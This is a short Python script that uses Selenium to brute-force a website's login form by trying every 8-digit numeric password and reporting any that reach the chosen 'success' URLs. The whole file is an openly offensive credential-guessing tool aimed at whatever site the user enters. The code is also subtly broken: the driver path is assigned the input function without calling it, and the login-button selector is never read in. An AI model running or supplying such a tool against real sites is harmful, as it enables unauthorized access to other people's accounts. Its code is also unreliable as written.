from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
import itertools
# import time

print('Path to your chrome driver:')
driver_path = input

print('Url which you want brutforce:')
login_url = input()

print('Url which you want get access:')
success_url = input()  # site where you want to fall

print('Second url which you want get access:')
user_url = input()  # Second site

print('password_field_selector:')
password_field_selector = input()
print('login_button_selector:')

def brute_force_login():
    service = Service(driver_path)
    driver = webdriver.Chrome(service=service)
    driver.get(login_url)
    print('Starting brut-force!')
    for combination in itertools.product('0123456789', repeat=8):
        password = ''.join(combination)
        
        password_field = driver.find_element(By.CSS_SELECTOR, password_field_selector)
        login_button = driver.find_element(By.CSS_SELECTOR, login_button_selector)
        
        password_field.clear()
        password_field.send_keys(password)
        login_button.click()

        # time.sleep(0.0001)  # change time if site dosen't work

        if driver.current_url == user_url:
            print(f'Login successful with password : {password}' + ' ' + driver.current_url)
            driver.get(login_url)
        if driver.current_url == success_url:
            print(f'Login successful with password : {password}' + ' ' + driver.current_url)
            driver.get(login_url)

        
    driver.quit()

brute_force_login()

    
